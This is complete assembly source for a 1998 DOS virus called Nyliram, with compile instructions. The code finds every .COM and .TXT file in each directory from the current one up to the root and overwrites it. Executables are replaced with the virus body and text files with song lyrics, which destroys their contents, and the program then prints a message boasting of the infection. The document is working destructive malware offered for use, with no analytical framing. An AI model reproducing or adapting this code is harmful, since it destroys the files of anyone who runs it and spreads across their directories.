; ------------------------------------------------------------------------- ;
;          Nyliram v1.0 coded by KilJaeden of The Codebreakers 1998         ;
; ------------------------------------------------------------------------- ;
; to compile ::] tasm nyliram.asm                                           ;
; to link :::::] tlink /t nyliram.obj                                       ;
; --------------------------------------------------------------------------;

code    segment                         ; segment named code
        assume  cs:code,ds:code         ; assign cs and ds to code
        org     100h                    ; .com file 100 hex
main    proc    near                    ; main procedure near

first_com:
        mov     ah,4eh                  ; find the first file

find_first_com:
        xor     cx,cx                   ; cx to 0
        lea     dx,comfile              ; load *.com into dx
        int     21h                     ; make it so DOS!
        jc      first_txt               ; if no .com found, find .txt

open_com:
        mov     ax,3d02h                ; open file with read/write
        mov     dx,9eh                  ; get file name from DTA (80+1e)
        int     21h                     ; make it so DOS!

infect_com:
        xchg    bx,ax                   ; move file info from ax to bx
        mov     ah,40h                  ; write to file
        mov     cx,offset finish - offset first_com ; replace with
        lea     dx,first_com            ; load effective address
        int     21h                     ; make it so DOS!

close_com:
        mov     ah,3eh                  ; close the file
        int     21h                     ; make it so DOS!
        mov     ah,4fh                  ; find next file
        jmp     find_first_com          ; jump to find_first_com

first_txt:
        mov     ah,4eh                  ; find first file

find_first_txt:
        xor     cx,cx                   ; cx to 0
        lea     dx,txtfile              ; load effective address *.txt
        int     21h                     ; make it so DOS!
        jc      next_dir                ; if none found, leave

open_txt:
        mov     ax,3d02h                ; open file with read/write
        mov     dx,9eh                  ; get file name info
        int     21h                     ; make it so DOS!

infect_txt:
        xchg    bx,ax                   ; put file info into bx
        mov     ah,40h                  ; write to file
        mov     cx,offset pload_finish - offset pload_start ; replace with
        lea     dx,pload_start          ; load effective address
        int     21h                     ; make it so DOS!

close_txt:
        mov     ah,3eh                  ; close up the file
        int     21h                     ; make it so DOS!
        mov     ah,4fh                  ; find next file
        jmp     find_first_txt          ; jump to start again

next_dir:
        lea     dx,dotdot               ; load .. into dx
        mov     ah,3bh                  ; the int for changing directories
        int     21h                     ; make it so!
        jnc     first_com               ; jump to first com, start again!

end_virus:
        mov     ah,09h                  ; print a message
        mov     dx,offset done          ; the message
        int     21h                     ; make it so DOS!
        int     20h                     ; end the program

pload_start:
db      'There''s not much left to love',10             ; payload in txt
db      'Too tired today to hate',10                    ; payload in txt
db      'I feel the minute of decay',10                 ; payload in txt
db      'I''m on my way down now',10                    ; payload in txt
db      'I''d like to take you with me',10              ; payload in txt
db      'I''m on my way down...',10                     ; payload in txt
db      'I''m on my way down now',10                    ; payload in txt
db      'I''d like to take you with me',10              ; payload in txt
db      'I''m on my way down now',10                    ; payload in txt
db      'The minute that it''s born',10                 ; payload in txt
db      'It begins to die',10                           ; payload in txt
db      'I''d love to just give in',10                  ; payload in txt
db      'I''d love to live this lie',10                 ; payload in txt
db      'I''ve been to black and back',10               ; payload in txt
db      'I''ve whited out my name',10                   ; payload in txt
db      'A lack of pain, a lack of hope',10             ; payload in txt
db      'A lack of anything to say',10                  ; payload in txt
db      'There is no cure for what is killing me',10    ; payload in txt
db      'I''m on my way down',10                        ; payload in txt
db      'I''ve looked ahead and saw',10                 ; payload in txt
db      'A world that''s dead',10                       ; payload in txt
db      'I guess that I am too',10                      ; payload in txt
db      ' ',10                                          ; payload in txt
db      'I''m On My Way Down Now',10                    ; payload in txt
pload_finish    label   near                            ; the end label

data_area:
dotdot  db      "..",0
comfile db      "*.com",0
txtfile db      "*.txt",0
done    db      '                                                           ',10,13
        db      '***********************************************************',10,13
        db      'You have infected all .com .txt files from this directory  ',10,13
        db      'to the root directory with the Nyliram virus, written by:  ',10,13
        db      '             KilJaeden of the Codebreakers ''98            ',10,13
        db      '***********************************************************',10,13,'$'

finish  label   near
main    endp
code    ends
end     first_com
